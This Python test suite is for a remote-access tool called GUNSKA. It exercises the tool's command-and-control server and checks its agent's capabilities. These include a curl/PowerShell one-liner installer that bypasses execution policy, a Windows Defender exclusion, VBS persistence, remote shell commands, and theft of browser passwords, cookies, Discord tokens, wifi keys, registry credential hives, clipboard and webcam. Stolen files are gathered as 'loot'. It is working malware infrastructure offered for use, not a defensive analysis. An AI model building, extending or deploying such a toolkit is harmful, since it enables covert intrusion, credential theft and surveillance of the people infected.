#!/usr/bin/env python3
"""GUNSKA smoke tests — real HTTP against a real server process.

    python3 test_smoke.py -v
"""
import base64
import http.client
import json
import os
import socket
import subprocess
import sys
import time
import unittest

ROOT = os.path.dirname(os.path.abspath(__file__))
AUTH = "testauth"
TOK = "testtoken"
PROC = None


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


PORT = free_port()


def req(method, path, body=None, headers=None, auth=True, timeout=15):
    c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=timeout)
    h = dict(headers or {})
    if auth:
        h["X-Auth"] = AUTH
    if isinstance(body, str):
        body = body.encode()
    c.request(method, path, body=body, headers=h)
    r = c.getresponse()
    data = r.read()
    hdrs = dict(r.getheaders())
    c.close()
    return r.status, data, hdrs


def agent_post(sid, obj, tok=TOK):
    return req("POST", "/r/%s?t=%s" % (sid, tok), json.dumps(obj), auth=False)


def drain(sid):
    """Kayfrregh l'queue w kayrje3 l'commands."""
    st, body, _ = req("GET", "/p/%s?t=%s" % (sid, TOK), auth=False)
    return json.loads(body)["c"]


class Smoke(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        global PROC
        env = dict(os.environ, PORT=str(PORT), AUTH=AUTH, AGENT_TOKEN=TOK, BASE_URL="")
        PROC = subprocess.Popen([sys.executable, "app.py"], cwd=ROOT, env=env,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for _ in range(100):
            try:
                if req("GET", "/healthz", auth=False)[0] == 200:
                    return
            except Exception:
                time.sleep(0.1)
        raise RuntimeError("server did not start")

    @classmethod
    def tearDownClass(cls):
        PROC.terminate()
        PROC.wait(timeout=10)

    def test_health(self):
        st, body, _ = req("GET", "/healthz", auth=False)
        self.assertEqual(st, 200)
        self.assertEqual(body, b"ok")

    def test_panel_brand(self):
        st, body, hdrs = req("GET", "/", auth=False)
        self.assertEqual(st, 200)
        self.assertIn("GUNSKA", body.decode())
        self.assertIn("text/html", hdrs["Content-Type"])

    def test_bootstrap_replaces_base(self):
        st, body, _ = req("GET", "/i", auth=False)
        self.assertEqual(st, 200)
        text = body.decode()
        self.assertNotIn("__B__", text)
        self.assertIn("127.0.0.1:%d" % PORT, text)

    def test_agent_source_has_token(self):
        st, body, _ = req("GET", "/a", auth=False)
        self.assertEqual(st, 200)
        text = body.decode()
        self.assertIn(TOK, text)
        self.assertNotIn("__TOKEN__", text)

    def test_api_requires_auth(self):
        st, _, _ = req("GET", "/api/sessions", auth=False)
        self.assertEqual(st, 401)

    def test_query_key_auth(self):
        st, _, _ = req("GET", "/api/sessions?k=" + AUTH, auth=False)
        self.assertEqual(st, 200)

    def test_link(self):
        st, body, _ = req("GET", "/link")
        self.assertEqual(st, 200)
        text = body.decode()
        self.assertIn("curl -fsSL", text)
        self.assertIn("-NoProfile", text)
        self.assertIn("-ExecutionPolicy Bypass", text)
        self.assertIn("windows_simple", text)

    def test_link_has_retry_loop(self):
        st, body, _ = req("GET", "/link")
        self.assertEqual(st, 200)
        text = body.decode()
        self.assertIn("1..5", text)
        self.assertIn("catch", text)

    def test_api_links_uses_base(self):
        st, body, _ = req("GET", "/api/links")
        self.assertEqual(st, 200)
        j = json.loads(body)
        self.assertIn("127.0.0.1:%d/i.ps1" % PORT, j["windows"])
        self.assertIn("127.0.0.1:%d/i" % PORT, j["linux"])
        self.assertNotIn("%%", j["windows"])

    def test_panel_reads_query_key(self):
        st, body, _ = req("GET", "/", auth=False)
        self.assertEqual(st, 200)
        text = body.decode()
        self.assertIn("location.search", text)
        self.assertIn("replaceState", text)

    def test_panel_no_hardcoded_domain(self):
        _, body, _ = req("GET", "/", auth=False)
        self.assertIn("api/links", body.decode())

    def test_psh_prefers_embed_python(self):
        st, body, _ = req("GET", "/i.ps1", auth=False)
        self.assertEqual(st, 200)
        text = body.decode()
        self.assertIn("LOCALAPPDATA", text)
        self.assertIn("function OK", text)
        self.assertIn("HasExited", text)
        self.assertLess(text.index("/py"), text.index("Get-Command python"))

    def test_psh_fallback_order(self):
        _, body, _ = req("GET", "/i.ps1", auth=False)
        text = body.decode()
        self.assertLess(text.index("Get-Command py"), text.index("Get-Command python3"))
        self.assertLess(text.index("Get-Command python3"), text.index("Get-Command python "))

    def test_psh_stub_guard(self):
        _, body, _ = req("GET", "/i.ps1", auth=False)
        self.assertIn("WindowsApps", body.decode())

    def test_psh_marker_and_visible_errors(self):
        _, body, _ = req("GET", "/i.ps1", auth=False)
        text = body.decode()
        self.assertIn(".live", text)
        self.assertIn("MessageBox", text)
        self.assertIn("function Die", text)
        self.assertNotIn('$ErrorActionPreference="Stop"', text)

    def test_psh_run_cmd_has_space(self):
        _, body, _ = req("GET", "/i.ps1", auth=False)
        text = body.decode()
        self.assertIn('start "" "', text)
        self.assertIn("run.vbs", text)

    def test_psh_defender_exclusion(self):
        _, body, _ = req("GET", "/i.ps1", auth=False)
        self.assertIn("Add-MpPreference", body.decode())

    def test_agent_token_enforced(self):
        st, _, _ = req("GET", "/p/zzz", auth=False)
        self.assertEqual(st, 403)
        st, _, _ = req("GET", "/p/zzz?t=wrong", auth=False)
        self.assertEqual(st, 403)

    def test_hello_and_sessions(self):
        agent_post("s1", {"t": "hello", "info": {"user": "u", "host": "h", "ip": "1.2.3.4", "os": "Linux"}})
        st, body, _ = req("GET", "/api/sessions")
        self.assertEqual(st, 200)
        rows = json.loads(body)
        me = [r for r in rows if r["id"] == "s1"]
        self.assertTrue(me and me[0]["on"] and me[0]["host"] == "h")

    def test_cmd_roundtrip(self):
        agent_post("s1", {"t": "hello", "info": {"user": "u", "host": "h", "ip": "1.2.3.4", "os": "Linux"}})
        st, _, _ = req("POST", "/api/cmd", json.dumps({"sid": "s1", "cmd": "id"}))
        self.assertEqual(st, 200)
        cmd = drain("s1")[0]
        self.assertEqual(cmd["t"], "shell")
        self.assertEqual(cmd["a"], "id")

        agent_post("s1", {"t": "out", "id": cmd["id"], "d": "uid=0\n"})
        st, body, _ = req("GET", "/api/out?sid=s1&after=0")
        self.assertEqual(st, 200)
        self.assertIn("uid=0", json.loads(body)["lines"])

    def test_new_commands_mapped(self):
        agent_post("s1", {"t": "hello", "info": {}})
        for cmd, kind in ((".hash", "hash"), (".wifi", "wifi"), (".discord", "discord"),
                          (".passwords", "passwords"), (".cookies", "cookies"),
                          (".tokens", "tokens"), (".tg", "tg"), (".all", "all")):
            st, _, _ = req("POST", "/api/cmd", json.dumps({"sid": "s1", "cmd": cmd}))
            self.assertEqual(st, 200)
            last = drain("s1")[-1]
            self.assertEqual(last["t"], kind, cmd)

    def test_leave_is_noop(self):
        agent_post("s1", {"t": "hello", "info": {}})
        req("POST", "/api/cmd", json.dumps({"sid": "s1", "cmd": ".leave"}))
        self.assertEqual(drain("s1")[0]["t"], "noop")

    def test_bad_after_value(self):
        st, _, _ = req("GET", "/api/out?sid=s1&after=abc")
        self.assertEqual(st, 200)

    def test_loot_upload_and_download(self):
        agent_post("s1", {"t": "hello", "info": {}})
        payload = b"hello loot"
        agent_post("s1", {"t": "file", "fid": "f1", "name": "a.txt", "i": 0,
                          "d": base64.b64encode(payload).decode(), "last": True})
        st, body, _ = req("GET", "/api/loot")
        self.assertEqual(st, 200)
        self.assertTrue(any(f["id"] == "f1" for f in json.loads(body)))
        st, body, hdrs = req("GET", "/api/loot/f1")
        self.assertEqual(st, 200)
        self.assertEqual(body, payload)
        self.assertIn("a.txt", hdrs["Content-Disposition"])

    def test_loot_chunked(self):
        agent_post("s2", {"t": "hello", "info": {}})
        parts = [b"AAA", b"BBB", b"CCC"]
        for i, p in enumerate(parts):
            agent_post("s2", {"t": "file", "fid": "f2", "name": "b.bin", "i": i,
                              "d": base64.b64encode(p).decode(), "last": i == len(parts) - 1})
        st, body, _ = req("GET", "/api/loot/f2")
        self.assertEqual(st, 200)
        self.assertEqual(body, b"".join(parts))

    def test_loot_named_in_out(self):
        agent_post("s3", {"t": "hello", "info": {}})
        agent_post("s3", {"t": "file", "fid": "f3", "name": "c.txt", "i": 0,
                          "d": base64.b64encode(b"x").decode(), "last": True})
        _, body, _ = req("GET", "/api/out?sid=s3&after=0")
        self.assertTrue(any("[loot]" in l for l in json.loads(body)["lines"]))

    def test_loot_path_sanitized(self):
        agent_post("s3", {"t": "hello", "info": {}})
        agent_post("s3", {"t": "file", "fid": "f4", "name": "../../evil.txt", "i": 0,
                          "d": base64.b64encode(b"x").decode(), "last": True})
        st, _, hdrs = req("GET", "/api/loot/f4")
        self.assertEqual(st, 200)
        self.assertIn("evil.txt", hdrs["Content-Disposition"])

    def test_put_queue(self):
        agent_post("s1", {"t": "hello", "info": {}})
        st, _, _ = req("POST", "/api/put", b"abcdef",
                       {"X-Sid": "s1", "X-Name": "x.bin"})
        self.assertEqual(st, 200)
        kinds = [c["t"] for c in drain("s1")]
        self.assertEqual(kinds, ["put_begin", "put_chunk", "put_end"])

    def test_unknown_route(self):
        st, _, _ = req("GET", "/nope", auth=False)
        self.assertEqual(st, 404)


class Static(unittest.TestCase):
    def test_compiles(self):
        import py_compile
        for f in ("app.py", "agent.py", "console.py", "crackpassword.py"):
            py_compile.compile(os.path.join(ROOT, f), doraise=True)

    def test_agent_marker(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("def _mark", text)
        self.assertIn(".live", text)

    def test_agent_hello_retries(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn('while True:\n        if post({"t": "hello"', text)
        self.assertIn("n % 30 == 0", text)

    def test_agent_post_retries(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("def post(o, timeout=40, tries=3)", text)
        self.assertIn("for i in range(tries)", text)

    def test_agent_discord_dpapi(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("dQw4w9WgXcQ", text)
        self.assertIn("_dpapi", text)

    def test_agent_hash_hives(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("reg save hklm", text)
        self.assertIn("cmdkey /list", text)

    def test_agent_exfil_fallback(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("if not sent or (rid and size <=", text)
        self.assertIn("auto_exfil", text)

    def test_agent_wifi(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("netsh wlan show profile", text)
        self.assertIn("key=clear", text)

    def test_agent_persist_vbs(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("run.vbs", text)
        self.assertIn('start "" "%s" "%s"', text)

    def test_agent_steal_capped(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("_add_capped", text)
        self.assertIn("MAX_TAR", text)

    def test_agent_clip_windows(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("Set-Clipboard", text)
        self.assertIn("Get-Clipboard", text)

    def test_agent_cam_windows(self):
        with open(os.path.join(ROOT, "agent.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("dshow", text)
        self.assertIn("_dshow_dev", text)

    def test_crackpassword_clean(self):
        with open(os.path.join(ROOT, "crackpassword.py"), encoding="utf-8") as f:
            text = f.read()
        self.assertIn("def crack_sudo", text)
        self.assertNotIn("run_command(", text)
        self.assertNotIn("child.close\n", text)


if __name__ == "__main__":
    unittest.main(verbosity=2)
